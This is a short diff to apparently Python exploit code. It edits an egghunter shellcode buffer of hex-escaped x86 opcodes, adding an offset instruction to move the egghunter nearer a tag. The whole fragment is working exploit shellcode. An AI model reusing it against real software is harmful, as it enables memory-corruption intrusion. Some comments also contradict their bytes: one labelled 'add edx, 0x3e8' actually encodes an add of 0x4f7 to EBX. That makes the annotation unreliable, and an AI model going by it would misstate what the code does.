@@ -17,7 +17,14 @@ eggh = (
 "\x53"                                # PUSH EBX
 "\xb3\xc0"			      			  # MOV BL,0xc0
 "\x66\x81\xCA\xFF\x0F"                # OR DX,0FFF
-"\x89\xEA"   # mov edx, ebp
+
+# Edit - Moving Egghunter close to start of tag
+"\x89\xEA"                            # mov edx, ebp
+# "\x81\xC3\xF7\x04\x00\x00"            # add edx, 0x4f7 <- This may be too close unless offset is always the same
+"\x81\xC3\xF7\x04\x00\x00"            # add edx, 0x3e8 (decimal 1000)
+### 
+
+
 "\x42"                                # INC EDX
 "\x52"                                # PUSH EDX
 "\x6A\x26"    						  # PUSH 26 
